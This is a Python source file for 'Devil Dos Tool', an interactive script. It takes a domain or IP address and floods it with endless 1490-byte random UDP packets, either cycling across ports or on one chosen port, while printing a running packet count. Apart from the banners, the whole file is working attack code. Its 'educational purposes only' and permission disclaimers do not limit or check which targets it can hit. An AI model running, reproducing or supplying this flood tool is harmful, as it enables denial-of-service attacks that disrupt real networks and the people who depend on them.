import socket
import random
from platform import system 
import time
import shutil
import os

def banner():
    terminal_width = shutil.get_terminal_size().columns

    ascii_art = [
        " \033[1;31m$$$$$$$\\                      $$\\ $$\\       $$$$$$$\\             $$$$$$\\  ",
        " \033[1;31m$$  __$$\\                     \\__|$$ |      $$  __$$\\           $$  __$$\\ ",
        " \033[1;31m$$ |  $$ | $$$$$$\\ $$\\    $$\\ $$\\ $$ |      $$ |  $$ | $$$$$$\\  $$ /  \\__|",
        "\033[1;31m$$ |  $$ |$$  __$$\\\\$$\\  $$  |$$ |$$ |      $$ |  $$ |$$  __$$\\ \\$$$$$$\\ ",
        " \033[1;31m$$ |  $$ |$$$$$$$$ |\\$$\\$$  / $$ |$$ |      $$ |  $$ |$$ /  $$ | \\____$$\\ ",
        " \033[1;31m$$ |  $$ |$$   ____| \\$$$  /  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$\\   $$ |",
        " \033[1;31m$$$$$$$  |\\$$$$$$$\\   \\$  /   $$ |$$ |      $$$$$$$  |\\$$$$$$  |\\$$$$$$  |",
        " \033[1;31m\\_______/  \\_______|   \\_/    \\__|\\__|      \\_______/  \\______/  \\______/ ",
        " \033[1;31m                          Author: Dieh4cker                               \033[0m",
        " \033[1;31m                      Only for legal purposes                             \033[0m",
    ]

    for line in ascii_art:
        print(line.center(terminal_width))

def about_tool():
    terminal_width = shutil.get_terminal_size().columns

    ascii_art = [
        "\033[1;31m⚠️  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY ⚠️\033[0m",
        "\033[1;36m═══════════════════════════════════════════════════════════════════════════════\033[0m",
        "\033[1;33m❖ Name       : \033[1;37mDevil Dos Tool\033[0m                     ",
        "\033[1;33m❖ Author     : \033[1;37mDieH4cker\033[0m                          ",
        "\033[1;33m ❖ Version    : \033[1;37m2.1\033[0m                                 ",
        "\033[1;33m  ❖ Language   : \033[1;37mPython\033[0m                              ",
        "\033[1;33m   ❖ Description:\033[0m                                               ",
        "\033[1;37m  Devil Dos is a lightweight, terminal-based DoS (Denial of Service)\033[0m",
        "\033[1;37m  attack simulation tool. It is designed to generate traffic floods\033[0m",
        "\033[1;37m  using UDP packets to test the stress limits of target services\033[0m",
        "\033[1;37m  under ethical and controlled environments.\033[0m",
        "\033[1;36m───────────────────────────────────────────────────────────────────────────────\033[0m",
        "\033[1;33m❖ Usage Disclaimer:\033[0m",
        "\033[1;32m    ✓ Educational research\033[0m",
        "\033[1;32m    ✓ Penetration testing (with permission)\033[0m",
        "\033[1;32m    ✓ Network resilience testing (on owned systems)\033[0m",
        "",
        "\033[1;31m    ❗ Unauthorized use against any public or private system without\033[0m",
        "\033[1;31m       explicit permission is illegal and unethical.\033[0m",
        "\033[1;31m    ❗ The creator is not responsible for any misuse or damage caused.\033[0m",
        "",
        "\033[1;36m❖ Respect the law. Respect the community.\033[0m",
        "\033[1;36m═══════════════════════════════════════════════════════════════════════════════\033[0m",
    ]

    for line in ascii_art:
        print(line.center(terminal_width))


sys_name=system()
cmd_clear = 'cls' if sys_name == "Windows" else 'clear'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)


while True:
    try:
        banner()
        print("\033[1;32m1. Domain Name\n2. IP Address\n3. About Tool\n4. Exit\033[0m")
        print('\033[0m')
        user_input = int(input("\033[1;31mEnter your choice [1,2,3,4]:\033[0m"))

        if user_input==1:
            domain=input("\033[1;31mEnter Domain Name : \033[0m")
            ip_addr=socket.gethostbyname(domain)
            break
        elif user_input==2:
            ip_addr=input("\033[1;31mEnter Target ip : \033[0m")
            break
        elif user_input==3:
            os.system(cmd_clear)
            banner()
            about_tool()
            input("Press Enter to continue.")
            os.system(cmd_clear)
        elif user_input==4:
            print("\033[1;31mExiting...\033[0m")
            time.sleep(2)
            exit()
        else:
            print("\033[1;31mInvalid choice! Please try again.\033[0m")
            time.sleep(3)
            os.system(cmd_clear)
            continue
    except ValueError:
        print("\033[1;31mInvalid input. Please enter a number between 1 and 4.\033[0m")
        time.sleep(3)
        os.system(cmd_clear)
    except socket.gaierror:
        print("\033[1;31mInvalid domain name. Please try again.\033[0m")
        time.sleep(3)
        os.system(cmd_clear)
    except KeyboardInterrupt:
        print("\n\033[1;31mExiting...\033[0m")
        time.sleep(1)
        os.system(cmd_clear)
        exit()


port_mode = False
port = 2

while True:
    user_choice = input("Do you want to use a specific port? [y/n]: ").lower()
    if user_choice == 'y':
        port_mode = True
        port = int(input("Enter the port number: "))
        break
    elif user_choice == 'n':
        break
    else:
        print("\033[31mInvalid choice! Please enter 'y' or 'n'.\033[0m")
        time.sleep(2)

print('\033[36;2mINITIALIZING....\033[0m')
time.sleep(1)
print('\033[36;2mSTARTING ATTACT...\033[0m')


sent = 1

while True:
    try:
        if not port_mode: 
            if port == 65534:
                port = 1
            elif port == 1900:
                port = 1901
            sock.sendto(bytes_data, (ip_addr, port))
            sent += 1
            port += 1
            print(f"\033[32;1mSent {sent} packets to {ip_addr} through port: {port}\033[0m")
        else:  
            if port < 2 or port == 65534:
                port = 2
            elif port == 1900:
                port = 1901
            sock.sendto(bytes_data, (ip_addr, port))
            sent += 1
            print(f"\033[32;1mSent {sent} packets to {ip_addr} through port: {port}\033[0m")
    except KeyboardInterrupt:
        print("\n\033[31;1mAttack stopped by user.\033[0m")
        break
    except socket.error as e:
        print(f"\033[31;1mSocket error: {e}\033[0m")
        break
    except Exception as e:
        print(f"\033[31;1mError: {e}\033[0m")
        break

    

